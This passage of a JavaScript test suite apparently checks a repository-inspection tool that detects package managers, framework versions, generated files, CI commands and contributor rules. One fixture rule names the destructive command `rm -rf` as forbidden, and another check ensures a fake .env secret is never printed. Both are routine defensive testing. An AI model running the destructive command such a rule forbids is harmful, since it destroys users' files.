    [{ 'package.json': '{"name":"p","packageManager":"pnpm@9.0.0"}' }, 'pnpm install', 'implied:package.json'],
    [{ 'package.json': '{"name":"p"}', 'package-lock.json': '{}' }, 'npm ci', 'implied:package-lock.json'],
    [{ 'package.json': '{"name":"p"}', 'yarn.lock': '' }, 'yarn install', 'implied:yarn.lock'],
    [{ 'package.json': '{"name":"p"}', 'bun.lock': '{}' }, 'bun install', 'implied:bun.lock'],
    [{ 'pyproject.toml': '[project]\nname = "p"\n[tool.uv]\n' }, 'uv sync', 'implied:pyproject.toml'],
    [{ 'pyproject.toml': '[tool.poetry]\nname = "p"\n', 'poetry.lock': '' }, 'poetry install', 'implied:poetry.lock'],
    [{ Gemfile: 'source "https://rubygems.org"\n' }, 'bundle install', 'implied:Gemfile'],
    [{ 'composer.json': '{"name":"a/b"}', 'composer.lock': '{}' }, 'composer install', 'implied:composer.lock'],
    [{ 'go.mod': 'module x\n\ngo 1.22\n', 'go.sum': '' }, 'go mod download', 'implied:go.sum'],
  ];
  for (const [files, cmd, source] of cases) {
    const dir = makeTmp();
    for (const [rel, content] of Object.entries(files)) write(dir, rel, content);
    const r = detect(dir);
    assert.deepEqual(r.commands.setup[0], { cmd, source }, cmd);
  }
});

test('npm without a lockfile uses npm install only when packageManager is known', () => {
  const dir = makeTmp();
  write(dir, 'package.json', '{"name":"p","packageManager":"npm@10.0.0"}');
  assert.deepEqual(detect(dir).commands.setup[0], { cmd: 'npm install', source: 'implied:package.json' });
  const unknown = makeTmp();
  write(unknown, 'package.json', '{"name":"p"}');
  assert.deepEqual(detect(unknown).commands.setup, []); // pm unknown, so nothing is invented
});

test('a locally declared setup script suppresses the implied default; CI install folds in', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', scripts: { bootstrap: 'node setup.js' } }));
  write(dir, 'package-lock.json', '{}');
  write(dir, '.github/workflows/ci.yml', 'jobs:\n  j:\n    steps:\n      - run: npm ci\n');
  const r = detect(dir);
  assert.deepEqual(cmds(r, 'setup'), ['npm run bootstrap', 'npm ci']);

  const plain = makeTmp();
  write(plain, 'package.json', '{"name":"p"}');
  write(plain, 'package-lock.json', '{}');
  write(plain, '.github/workflows/ci.yml', 'jobs:\n  j:\n    steps:\n      - run: npm ci\n');
  const p = detect(plain);
  assert.equal(p.commands.setup.length, 1);
  assert.equal(p.commands.setup[0].source, 'implied:package-lock.json');
  assert.deepEqual(p.commands.setup[0].alsoIn, ['.github/workflows/ci.yml']);
});

test('frameworks[].group: node fields', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({
    name: 'p',
    dependencies: { express: '^4.0.0' },
    devDependencies: { vitest: '^2.0.0' },
    peerDependencies: { react: '^18.0.0' },
    optionalDependencies: { hono: '^4.0.0' },
  }));
  const r = detect(dir);
  assert.deepEqual(
    Object.fromEntries(r.frameworks.map((f) => [f.name, f.group])),
    { express: 'runtime', vitest: 'dev', react: 'peer', hono: 'optional' },
  );
});

test('frameworks[].group: python runtime, optional, dev and test groups', () => {
  const dir = makeTmp();
  write(dir, 'pyproject.toml', [
    '[project]',
    'name = "app"',
    'dependencies = ["pydantic>=2"]',
    '',
    '[project.optional-dependencies]',
    'web = ["fastapi>=0.1"]',
    '',
    '[dependency-groups]',
    'tests = ["pytest>=8", "flask>=3"]',
    'lint = ["ruff>=0.6"]',
    'dev = ["mypy>=1"]',
    '',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(
    Object.fromEntries(r.frameworks.map((f) => [f.name, f.group])),
    { fastapi: 'optional', flask: 'test', mypy: 'dev', pydantic: 'runtime', pytest: 'test', ruff: 'dev' },
  );
});

test('frameworks[].group: poetry groups and a runtime mention beats a test mention', () => {
  const dir = makeTmp();
  write(dir, 'pyproject.toml', [
    '[tool.poetry]',
    'name = "app"',
    '',
    '[tool.poetry.dependencies]',
    'python = "^3.11"',
    'django = "^5.0"',
    '',
    '[tool.poetry.group.test.dependencies]',
    'pytest = "^8"',
    'django = "^5.0"',
    '',
    '[tool.poetry.group.dev.dependencies]',
    'ruff = "^0.6"',
    '',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(
    Object.fromEntries(r.frameworks.map((f) => [f.name, f.group])),
    { django: 'runtime', pytest: 'test', ruff: 'dev' },
  );
});

test('frameworks[].group: rust and php', () => {
  const rust = makeTmp();
  write(rust, 'Cargo.toml', [
    '[package]', 'name = "app"', 'version = "0.1.0"', '',
    '[dependencies]', 'axum = "0.7"', '',
    '[dev-dependencies]', 'tokio = "1"', '',
    '[build-dependencies]', 'serde = "1"', '',
  ].join('\n'));
  assert.deepEqual(
    Object.fromEntries(detect(rust).frameworks.map((f) => [f.name, f.group])),
    { axum: 'runtime', tokio: 'dev', serde: 'dev' },
  );

  const php = makeTmp();
  write(php, 'composer.json', JSON.stringify({ name: 'a/b', 'require-dev': { 'laravel/framework': '^11.0' } }));
  assert.equal(detect(php).frameworks[0].group, 'dev');
});

// ---------------------------------------------------------------------------
// Round 4: generated files
// ---------------------------------------------------------------------------

const generatedOf = (r) => Object.fromEntries(r.generated.map((g) => [g.path, g.evidence]));

test('generated: pre-commit hook plus script that names the file (fastapi pattern)', () => {
  const r = detect(fixture('generated-readme'));
  // README.md is generated by docs.py; CHANGELOG.md is not, because other.py never mentions it.
  assert.deepEqual(r.generated, [{ path: 'README.md', evidence: 'written by scripts/docs.py (generate-readme)' }]);
});

test('generated: header markers in the first five lines of text files', () => {
  const dir = makeTmp();
  write(dir, 'api.pb.go', '// Code generated by protoc-gen-go. DO NOT EDIT.\n// source: api.proto\n\npackage api\n');
  write(dir, 'src/types.ts', '/* @generated by openapi-typescript */\nexport type A = 1;\n');
  write(dir, 'src/client.py', '# auto-generated by codegen, do not touch\nX = 1\n');
  write(dir, 'docs/api.md', '<!-- DO NOT EDIT: built from schema -->\n# API\n');
  write(dir, 'src/auto.js', '// This file is automatically generated.\nmodule.exports = {};\n');
  write(dir, 'schema.json', '{\n  "@generated": true\n}\n');
  const r = detect(dir);
  assert.deepEqual(Object.keys(generatedOf(r)), ['api.pb.go', 'docs/api.md', 'schema.json', 'src/auto.js', 'src/client.py', 'src/types.ts']);
  assert.match(generatedOf(r)['api.pb.go'], /^header says: \/\/ Code generated by protoc-gen-go\. DO NOT EDIT\.$/);
});

test('generated: no false positives from prose, late lines, other extensions, big files or .env', () => {
  const dir = makeTmp();
  write(dir, 'README.md', 'This file is generated by hand, honestly.\n');
  write(dir, 'notes.md', 'one\ntwo\nthree\nfour\nfive\n<!-- DO NOT EDIT -->\n');
  write(dir, 'lib.rs', '/*!\nDocs.\n\nOther shells are\nsimilar.\n6. Better than the ones that are auto-generated.\n*/\n');
  write(dir, 'out.txt', '// Code generated by x. DO NOT EDIT.\n');
  write(dir, 'big.go', '// Code generated by x. DO NOT EDIT.\n' + 'x'.repeat(300 * 1024));
  write(dir, '.env', '# DO NOT EDIT\nSECRET=do-not-print\n');
  write(dir, '.env.json', '// @generated\n');
  write(dir, 'prose.py', 'def f():\n    """Do not edit the input; auto-generated names are ugly."""\n');
  const res = spawnSync(process.execPath, [SCRIPT, dir], { encoding: 'utf8' });
  const parsed = JSON.parse(res.stdout);
  assert.deepEqual(parsed.generated, []);
  assert.ok(!res.stdout.includes('do-not-print'));
});

test('generated: `command > FILE` in Makefile, package.json and shell scripts', () => {
  const dir = makeTmp();
  write(dir, 'Makefile', 'docs:\n\tpython tools/render.py > API.md\n\ntest:\n\tpytest > /dev/null 2>&1\n\nci:\n\techo done >> $GITHUB_OUTPUT\n');
  write(dir, 'package.json', JSON.stringify({ name: 'p', scripts: { 'gen:types': 'openapi-typescript api.yaml > src/types.ts', build: 'tsc > build.log' } }));
  write(dir, 'scripts/gen.sh', '#!/bin/sh\nset -e\nnode tools/changelog.js > CHANGELOG.md\n');
  for (const f of ['API.md', 'src/types.ts', 'CHANGELOG.md', 'api.yaml']) write(dir, f, 'x\n');
  // build.log is gitignored (so not tracked output); missing.txt does not exist.
  write(dir, 'build.log', '');
  write(dir, '.gitignore', 'build.log\n');
  const r = detect(dir);
  assert.deepEqual(generatedOf(r), {
    'API.md': 'written by Makefile (docs)',
    'CHANGELOG.md': 'written by scripts/gen.sh (> CHANGELOG.md)',
    'src/types.ts': 'written by package.json (gen:types)',
  });
});

test('generated: "generate FILE" in a package script or Makefile target, but not for the generator itself', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', scripts: {
    docs: 'echo generate README.md from sources && node tools/readme.js',
    build: 'node generate.js',
    lint: 'generate ghost.md',
  } }));
  write(dir, 'README.md', 'x\n');
  write(dir, 'generate.js', 'x\n');
  const r = detect(dir);
  assert.deepEqual(generatedOf(r), { 'README.md': 'written by package.json (docs)' });
});

test('generated: results are sorted, merged per path, and capped at 30', () => {
  const dir = makeTmp();
  for (let i = 0; i < 40; i++) write(dir, `gen/f${String(i).padStart(2, '0')}.go`, '// Code generated by x. DO NOT EDIT.\n');
  const r = detect(dir);
  assert.equal(r.generated.length, 30);
  assert.deepEqual(r.generated.map((g) => g.path), [...r.generated.map((g) => g.path)].sort());

  const both = makeTmp();
  write(both, 'API.md', '<!-- DO NOT EDIT -->\n');
  write(both, 'Makefile', 'docs:\n\ttool > API.md\n');
  assert.deepEqual(detect(both).generated, [
    { path: 'API.md', evidence: 'header says: <!-- DO NOT EDIT -->; written by Makefile (docs)' },
  ]);
});

// ---------------------------------------------------------------------------
// Round 5: walk budget, workspace members, platform commands, CI directories, versions
// ---------------------------------------------------------------------------

const pkgJson = (obj) => JSON.stringify(obj);

test('walk: .yarn/cache and similar stores are skipped, so workspaces and member commands survive', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
  write(dir, 'yarn.lock', '');
  write(dir, 'packages/aaa/package.json', pkgJson({ name: 'aaa', scripts: { build: 'tsc' } }));
  write(dir, 'packages/zzz/package.json', pkgJson({ name: 'zzz', scripts: { test: 'vitest' } }));
  for (let i = 0; i < 5200; i++) write(dir, `.yarn/cache/pkg-${i}.zip`, '');
  for (const skipped of ['.pnpm-store', '.idea', '.terraform', 'Pods', 'bower_components']) write(dir, `${skipped}/x/package.json`, '{}');
  const r = detect(dir);
  assert.deepEqual(r.workspaces, ['packages/aaa', 'packages/zzz']);
  assert.ok(cmds(r, 'build').includes('yarn --cwd packages/aaa build'));
  assert.ok(cmds(r, 'test').includes('yarn --cwd packages/zzz test'));
  assert.ok(!r.warnings.some((w) => w.startsWith('walk stopped')));
});

test('walk: when the budget runs out, workspaces and member commands are still found on disk', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
  write(dir, 'pnpm-lock.yaml', '');
  // Fifty source dirs sorted before `packages`, each with a subdirectory of 120 files: the walk
  // spends its whole budget on them before it reaches packages/*/package.json.
  for (let a = 0; a < 50; a++) {
    for (let f = 0; f < 120; f++) fs.mkdirSync(path.join(dir, `a${String(a).padStart(2, '0')}`, 's'), { recursive: true });
    for (let f = 0; f < 120; f++) fs.writeFileSync(path.join(dir, `a${String(a).padStart(2, '0')}`, 's', `f${f}.txt`), '');
  }
  write(dir, 'packages/aaa/package.json', pkgJson({ name: 'aaa', scripts: { build: 'tsc' } }));
  write(dir, 'packages/zzz/package.json', pkgJson({ name: 'zzz', scripts: { lint: 'eslint .' } }));
  const r = detect(dir);
  assert.ok(r.warnings.some((w) => w.startsWith('walk stopped')), 'truncation is reported');
  assert.deepEqual(r.workspaces, ['packages/aaa', 'packages/zzz']);
  assert.ok(cmds(r, 'build').includes('pnpm -C packages/aaa run build'));
  assert.ok(cmds(r, 'lint').includes('pnpm -C packages/zzz run lint'));
});

test('walk: 400 workspace packages are all found even though the walk cannot list them', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
  for (let i = 0; i < 400; i++) {
    write(dir, `packages/p${String(i).padStart(3, '0')}/package.json`, pkgJson({ name: `p${i}` }));
    for (let f = 0; f < 14; f++) fs.writeFileSync(path.join(dir, `packages/p${String(i).padStart(3, '0')}`, `f${f}.txt`), '');
  }
  assert.equal(detect(dir).workspaces.length, 400);
});

test('workspace members named build, dist, vendor or target are never skipped', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'] }));
  write(dir, 'package-lock.json', '{}');
  for (const name of ['build', 'dist', 'vendor', 'target', 'core']) {
    write(dir, `packages/${name}/package.json`, pkgJson({ name: `@x/${name}`, scripts: { test: 'node t.js' }, dependencies: { express: '^4.0.0' } }));
  }
  write(dir, 'packages/build/index.ts', 'export {};\n');
  const r = detect(dir);
  assert.deepEqual(r.workspaces, ['packages/build', 'packages/core', 'packages/dist', 'packages/target', 'packages/vendor']);
  assert.ok(cmds(r, 'test').includes('npm --prefix packages/build run test'));
  assert.ok(r.languages.some((l) => l.name === 'typescript'), 'the hidden member was walked');
  // A skipped name that is NOT a declared member is still skipped.
  write(dir, 'other/build/package.json', pkgJson({ dependencies: { vue: '^3.0.0' } }));
  assert.ok(!detect(dir).frameworks.some((f) => f.name === 'vue'));
});

test('JVM: Maven with wrapper, Gradle with toolchain, sbt', () => {
  const mvn = makeTmp();
  write(mvn, 'pom.xml', '<project><properties><maven.compiler.release>21</maven.compiler.release></properties></project>');
  write(mvn, 'mvnw', '#!/bin/sh\n');
  const m = detect(mvn);
  assert.equal(m.primary, 'jvm');
  assert.equal(m.packageManager, 'maven');
  assert.deepEqual(m.commands.build[0], { cmd: './mvnw verify', source: 'implied:pom.xml' });
  assert.deepEqual(cmds(m, 'test'), ['./mvnw test']);
  assert.equal(m.languageVersion.java, '21');

  const noWrapper = makeTmp();
  write(noWrapper, 'pom.xml', '<project><properties><java.version>17</java.version></properties></project>');
  assert.deepEqual(cmds(detect(noWrapper), 'test'), ['mvn test']);
  assert.equal(detect(noWrapper).languageVersion.java, '17');

  const gradle = makeTmp();
  write(gradle, 'build.gradle.kts', 'kotlin { jvmToolchain(17) }\njava { toolchain { languageVersion.set(JavaLanguageVersion.of(21)) } }\n');
  write(gradle, 'gradlew', '#!/bin/sh\n');
  const g = detect(gradle);
  assert.deepEqual(cmds(g, 'build'), ['./gradlew build']);
  assert.deepEqual(cmds(g, 'test'), ['./gradlew test']);
  assert.deepEqual(cmds(g, 'other'), ['./gradlew check']);
  assert.equal(g.languageVersion.java, '21');

  const sbt = makeTmp();
  write(sbt, 'build.sbt', 'name := "x"\nscalaVersion := "3.3.1"\n');
  write(sbt, 'src/Main.scala', 'object Main\n');
  const sb = detect(sbt);
  assert.equal(sb.primary, 'jvm');
  assert.deepEqual(cmds(sb, 'test'), ['sbt test']);
  assert.equal(sb.languages[0].name, 'scala');
});

test('JVM: version files', () => {
  const dir = makeTmp();
  write(dir, 'build.gradle', "sourceCompatibility = JavaVersion.VERSION_17\n");
  assert.equal(detect(dir).languageVersion.java, '17');
  const sdk = makeTmp();
  write(sdk, 'pom.xml', '<project/>');
  write(sdk, '.sdkmanrc', 'java=21.0.2-tem\n');
  assert.equal(detect(sdk).languageVersion.java, '21.0.2-tem');
  const jv = makeTmp();
  write(jv, 'pom.xml', '<project/>');
  write(jv, '.java-version', '17\n');
  assert.equal(detect(jv).languageVersion.java, '17');
});

test('.NET: solution commands and target framework', () => {
  const dir = makeTmp();
  write(dir, 'App.sln', '');
  write(dir, 'App.csproj', '<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>');
  write(dir, 'Program.cs', 'class P {}\n');
  const r = detect(dir);
  assert.equal(r.primary, 'dotnet');
  assert.deepEqual(cmds(r, 'build'), ['dotnet build']);
  assert.deepEqual(cmds(r, 'test'), ['dotnet test']);
  assert.deepEqual(cmds(r, 'format'), ['dotnet format --verify-no-changes']);
  assert.equal(r.commands.build[0].source, 'implied:App.sln');
  assert.equal(r.languageVersion.dotnet, 'net8.0');

  const nested = makeTmp();
  write(nested, 'src/Api/Api.csproj', '<Project><PropertyGroup><TargetFrameworks>net9.0;net8.0</TargetFrameworks></PropertyGroup></Project>');
  const n = detect(nested);
  assert.deepEqual(cmds(n, 'build'), ['dotnet build src/Api/Api.csproj']);
  assert.equal(n.languageVersion.dotnet, 'net9.0');

  const sdk = makeTmp();
  write(sdk, 'App.sln', '');
  write(sdk, 'global.json', '{"sdk":{"version":"8.0.100"}}');
  assert.equal(detect(sdk).languageVersion.dotnet, 'sdk 8.0.100');
});

test('Ruby: rspec, rails test, rake, rubocop and versions', () => {
  const spec = makeTmp();
  write(spec, 'Gemfile', 'source "https://rubygems.org"\nruby "3.3.0"\ngem "rails", "~> 7.1"\n');
  write(spec, 'spec/a_spec.rb', '');
  write(spec, 'bin/rails', '#!/usr/bin/env ruby\n');
  write(spec, '.rubocop.yml', 'AllCops: {}\n');
  const s = detect(spec);
  assert.deepEqual(cmds(s, 'test'), ['bundle exec rspec']);
  assert.deepEqual(cmds(s, 'lint'), ['bundle exec rubocop']);
  assert.equal(s.languageVersion.ruby, '3.3.0');
  assert.equal(framework(s, 'rails').version, '7.1');

  const rails = makeTmp();
  write(rails, 'Gemfile', 'gem "rails"\n');
  write(rails, 'Gemfile.lock', 'GEM\n  specs:\n    rails (7.2.1)\n');
  write(rails, 'bin/rails', '');
  write(rails, '.ruby-version', 'ruby-3.2.2\n');
  const r = detect(rails);
  assert.deepEqual(cmds(r, 'test'), ['bin/rails test']);
  assert.equal(framework(r, 'rails').version, '7.2.1');
  assert.equal(r.languageVersion.ruby, '3.2.2');

  const rake = makeTmp();
  write(rake, 'Gemfile', 'source "x"\n');
  write(rake, 'Rakefile', 'task :default\n');
  assert.deepEqual(cmds(detect(rake), 'test'), ['bundle exec rake']);
});

test('PHP: artisan, pest, phpunit and the required php version', () => {
  const laravel = makeTmp();
  write(laravel, 'composer.json', pkgJson({ name: 'a/b', require: { php: '^8.2', 'laravel/framework': '^11.0' }, 'require-dev': { 'pestphp/pest': '^3.0' } }));
  write(laravel, 'artisan', '#!/usr/bin/env php\n');
  const l = detect(laravel);
  assert.deepEqual(cmds(l, 'test'), ['php artisan test']);
  assert.equal(l.languageVersion.php, '^8.2');
  assert.equal(framework(l, 'laravel').version, '11.0');

  const pest = makeTmp();
  write(pest, 'composer.json', pkgJson({ name: 'a/b', 'require-dev': { 'pestphp/pest': '^3.0' } }));
  assert.deepEqual(cmds(detect(pest), 'test'), ['vendor/bin/pest']);

  const unit = makeTmp();
  write(unit, 'composer.json', pkgJson({ name: 'a/b' }));
  write(unit, 'phpunit.xml.dist', '<phpunit/>');
  assert.deepEqual(detect(unit).commands.test[0], { cmd: 'vendor/bin/phpunit', source: 'implied:phpunit.xml.dist' });

  const symfony = makeTmp();
  write(symfony, 'composer.json', pkgJson({ name: 'a/b', require: { 'symfony/framework-bundle': '^7.0' } }));
  assert.equal(framework(detect(symfony), 'symfony').version, '7.0');
});

test('CMake projects are primary "cpp" with build and ctest commands', () => {
  const dir = makeTmp();
  write(dir, 'CMakeLists.txt', 'cmake_minimum_required(VERSION 3.20)\nproject(demo LANGUAGES CXX)\n');
  write(dir, 'src/main.cpp', 'int main() {}\n');
  const r = detect(dir);
  assert.equal(r.primary, 'cpp');
  assert.equal(r.name, 'demo');
  assert.deepEqual(cmds(r, 'build'), ['cmake -S . -B build && cmake --build build']);
  assert.deepEqual(cmds(r, 'test'), ['ctest --test-dir build']);
  assert.equal(r.languages[0].name, 'cpp');

  const c = detect((() => {
    const d = makeTmp();
    write(d, 'CMakeLists.txt', 'project(x C)\n');
    write(d, 'main.c', 'int main(){}\n');
    return d;
  })());
  assert.equal(c.primary, 'cpp');
  assert.equal(c.languages[0].name, 'c');
});

test('platform commands appear only when their files exist', () => {
  const r = detect(fixture('empty'));
  for (const category of Object.values(r.commands)) assert.deepEqual(category, []);
});

test('frameworks used by knowledge gates are reported', () => {
  const node = makeTmp();
  write(node, 'package.json', pkgJson({
    name: 'p',
    dependencies: { zod: '^3.23.0', '@trpc/server': '^11.0.0', 'react-native': '0.76.0', expo: '~52.0.0' },
    devDependencies: { typescript: '^5.6.0' },
  }));
  assert.deepEqual(names(detect(node).frameworks), ['@trpc/server', 'expo', 'react-native', 'typescript', 'zod']);

  const rust = makeTmp();
  write(rust, 'Cargo.toml', '[package]\nname = "app"\nversion = "0.1.0"\n\n[dependencies]\nreqwest = { version = "0.12", features = ["json"] }\nsqlx = "0.8"\nrand = "0.8"\n');
  assert.deepEqual(names(detect(rust).frameworks), ['rand', 'reqwest', 'sqlx']);
});

test('spring-boot version from parent, BOM, plugin, buildscript and version catalog', () => {
  const sb = (files) => {
    const d = makeTmp();
    for (const [rel, content] of Object.entries(files)) write(d, rel, content);
    return framework(detect(d), 'spring-boot');
  };
  assert.equal(sb({ 'pom.xml': '<project><parent><artifactId>spring-boot-starter-parent</artifactId><version>3.2.4</version></parent></project>' }).version, '3.2.4');
  assert.equal(sb({ 'pom.xml': '<project><dependencyManagement><dependencies><dependency><artifactId>spring-boot-dependencies</artifactId><version>3.1.0</version></dependency></dependencies></dependencyManagement></project>' }).version, '3.1.0');
  assert.equal(sb({ 'pom.xml': '<project><parent><artifactId>spring-boot-starter-parent</artifactId><version>${spring.boot.version}</version></parent><properties><spring.boot.version>3.3.1</spring.boot.version></properties></project>' }).version, '3.3.1');
  assert.equal(sb({ 'build.gradle.kts': 'plugins { id("org.springframework.boot") version "3.2.0" }' }).version, '3.2.0');
  assert.equal(sb({ 'build.gradle': "buildscript { dependencies { classpath 'org.springframework.boot:spring-boot-gradle-plugin:2.7.18' } }" }).version, '2.7.18');
  assert.equal(sb({ 'build.gradle': "ext { springBootVersion = '3.0.5' }\napply plugin: 'org.springframework.boot'" }).version, '3.0.5');
  assert.equal(sb({ 'build.gradle.kts': 'plugins { alias(libs.plugins.spring.boot) }  // spring boot', 'gradle/libs.versions.toml': '[versions]\nspringBoot = "3.4.0"\n' }).version, '3.4.0');
  assert.equal(sb({ 'build.gradle': "plugins { id 'org.springframework.boot' }" }).version, null);
});

// -- CI directories ---------------------------------------------------------

function ciRepo(workflow, extra = {}) {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'p' }));
  write(dir, 'package-lock.json', '{}');
  write(dir, '.github/workflows/ci.yml', workflow);
  for (const [rel, content] of Object.entries(extra)) write(dir, rel, content);
  return dir;
}
const ciCmds = (r) => Object.values(r.commands).flat().filter((c) => c.source === '.github/workflows/ci.yml').map((c) => c.cmd).sort();

test('CI: step working-directory is kept as `cd <dir> && cmd`', () => {
  const r = detect(ciRepo([
    'jobs:',
    '  j:',
    '    steps:',
    '      - run: npm ci',
    '        working-directory: frontend',
    '      - name: Test',
    '        working-directory: ./frontend/app',
    '        run: npm test',
    '      - run: npm run lint',
    '',
  ].join('\n')));
  assert.deepEqual(ciCmds(r), ['cd frontend && npm ci', 'cd frontend/app && npm test', 'npm run lint']);
});

test('CI: job and workflow defaults.run.working-directory apply to their steps only', () => {
  const r = detect(ciRepo([
    'defaults:',
    '  run:',
    '    working-directory: web',
    'jobs:',
    '  a:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - run: npm test',
    '  b:',
    '    runs-on: ubuntu-latest',
    '    defaults:',
    '      run:',
    '        working-directory: api',
    '    steps:',
    '      - run: pytest -x',
    '      - run: npm run build',
    '        working-directory: tools',
    '',
  ].join('\n')));
  assert.deepEqual(ciCmds(r), ['cd api && pytest -x', 'cd tools && npm run build', 'cd web && npm test']);
});

test('CI: `cd dir && cmd` and multi-line `cd dir` keep their directory', () => {
  const r = detect(ciRepo([
    'jobs:',
    '  j:',
    '    steps:',
    '      - run: cd frontend && npm ci',
    '      - run: |',
    '          cd backend',
    '          pytest -x',
    '          npm run lint',
    '      - run: |',
    '          cd "$HOME/somewhere"',
    '          npm run build',
    '      - name: Expression dir',
    '        working-directory: ${{ matrix.dir }}',
    '        run: npm test',
    '',
  ].join('\n')));
  // Unknown directories (variables, expressions) drop the command instead of misplacing it.
  assert.deepEqual(ciCmds(r), ['cd backend && npm run lint', 'cd backend && pytest -x', 'cd frontend && npm ci']);
  assert.deepEqual(cmds(r, 'setup').filter((c) => c.startsWith('cd ')), ['cd frontend && npm ci']);
});

test('CI: a working-directory on another step does not leak', () => {
  const r = detect(ciRepo([
    'jobs:',
    '  j:',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '        with:',
    '          path: x',
    '      - run: npm test',
    '      - run: npm run lint',
    '        working-directory: sub',
    '',
  ].join('\n')));
  assert.deepEqual(ciCmds(r), ['cd sub && npm run lint', 'npm test']);
});

// -- Hard rules --------------------------------------------------------------

test('hard rules: hard-wrapped sentences are joined before matching', () => {
  const dir = makeTmp();
  write(dir, 'CONTRIBUTING.md', [
    'All use of AI in contributions must follow the',
    '[AI policy](docs/ai.md) and be disclosed in the pull',
    'request description.',
    '',
    '- Never commit generated files;',
    '  they are rebuilt in CI.',
    '- Run the tests.',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates, [
    { text: 'All use of AI in contributions must follow the [AI policy](docs/ai.md) and be disclosed in the pull request description.', source: 'CONTRIBUTING.md:1' },
    { text: 'Never commit generated files; they are rebuilt in CI.', source: 'CONTRIBUTING.md:5' },
  ]);
});

test('hard rules: a sentence that runs into a short code block finishes with the code inline', () => {
  const dir = makeTmp();
  write(dir, 'CONTRIBUTING.md', [
    'If your change should appear in the changelog, it must be captured by `changeset` which is done by running',
    '',
    '```bash',
    'pnpm changeset',
    '```',
    '',
    'Never edit the lockfile by hand; run these in order:',
    '',
    '```sh',
    'pnpm install',
    'pnpm test',
    '```',
    '',
    'Never skip the hooks; run:',
    '',
    '```sh',
    'a', 'b', 'c', 'd',
    '```',
    '',
    'Never push to main.',
    '',
    '```sh',
    'git status',
    '```',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates, [
    {
      text: 'If your change should appear in the changelog, it must be captured by `changeset` which is done by running `pnpm changeset`.',
      source: 'CONTRIBUTING.md:1',
    },
    { text: 'Never edit the lockfile by hand; run these in order: `pnpm install && pnpm test`.', source: 'CONTRIBUTING.md:7' },
    // More than three code lines, and a sentence that already ends with a period: left alone.
    { text: 'Never skip the hooks; run:', source: 'CONTRIBUTING.md:14' },
    { text: 'Never push to main.', source: 'CONTRIBUTING.md:23' },
  ]);
});

test('hard rules: sections claude-setup wrote into AGENTS.md are not offered back', () => {
  const dir = makeTmp();
  write(dir, 'AGENTS.md', [
    '# Project',
    '',
    '## Commands',
    '',
    '- Never run `rm -rf` here.',
    '',
    '## Hard rules',
    '',
    '- "PII never in logs." (README.md:41)',
    '',
    '## Boundaries',
    '',
    'Never: edit generated files; commit .env*.',
    '',
    '## Version notes',
    '',
    '- Next 15: never use pages router.',
    '',
    '## Working agreements',
    '',
    '- Always ask before adding dependencies.',
    '',
    '## Team conventions',
    '',
    '- Never force-push to main.',
    '',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates, [{ text: 'Never force-push to main.', source: 'AGENTS.md:25' }]);
});

// -- Versions ----------------------------------------------------------------

test('versions: non-version specifiers give version null and keep the raw text in range', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'p', dependencies: {
    next: 'catalog:', react: 'latest', vue: 'npm:vue@3.4.0', express: 'workspace:*', svelte: 'github:sveltejs/svelte',
    hono: '*', fastify: 'file:../fastify', astro: 'link:../astro', vite: 'git+https://github.com/vitejs/vite.git',
  } }));
  const byName = Object.fromEntries(detect(dir).frameworks.map((f) => [f.name, [f.version, f.range]]));
  assert.deepEqual(byName.next, [null, 'catalog:']);
  assert.deepEqual(byName.react, [null, 'latest']);
  assert.deepEqual(byName.vue, ['3.4.0', '']);
  assert.deepEqual(byName.express, [null, 'workspace:*']);
  assert.deepEqual(byName.svelte, [null, 'github:sveltejs/svelte']);
  assert.deepEqual(byName.hono, [null, '*']);
  assert.deepEqual(byName.fastify, [null, 'file:../fastify']);
  assert.deepEqual(byName.astro, [null, 'link:../astro']);
  assert.deepEqual(byName.vite, [null, 'git+https://github.com/vitejs/vite.git']);
});

test('versions: npm aliases keep the inner range and a real version beats a link elsewhere', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'root', workspaces: ['packages/*'], dependencies: { vue: 'npm:vue@^3.4.0' } }));
  write(dir, 'packages/a/package.json', pkgJson({ name: 'a', dependencies: { react: 'workspace:*' } }));
  write(dir, 'packages/b/package.json', pkgJson({ name: 'b', dependencies: { react: '^18.2.0' } }));
  const r = detect(dir);
  assert.deepEqual([framework(r, 'vue').version, framework(r, 'vue').range], ['3.4.0', '^']);
  assert.deepEqual([framework(r, 'react').version, framework(r, 'react').where], ['18.2.0', 'packages/b/package.json']);
});

test('versions: pnpm catalogs resolve from pnpm-workspace.yaml', () => {
  const dir = makeTmp();
  write(dir, 'pnpm-workspace.yaml', [
    'packages:',
    "  - 'apps/*'",
    'catalog:',
    '  react: ^19.0.0',
    '  "@trpc/server": 11.0.1 # pinned',
    'catalogs:',
    '  legacy:',
    '    next: "14.2.0"',
    '    hono: ^4.5.0',
    '',
  ].join('\n'));
  write(dir, 'package.json', pkgJson({ name: 'root', packageManager: 'pnpm@10.0.0' }));
  write(dir, 'apps/web/package.json', pkgJson({ name: 'web', dependencies: { react: 'catalog:', next: 'catalog:legacy', zod: 'catalog:', '@trpc/server': 'catalog:default' } }));
  write(dir, 'apps/old/package.json', pkgJson({ name: 'old', dependencies: { hono: 'catalog:legacy' } }));
  const r = detect(dir);
  const get = (n) => [framework(r, n).version, framework(r, n).range];
  assert.deepEqual(get('react'), ['19.0.0', '^']);
  assert.deepEqual(get('hono'), ['4.5.0', '^']);
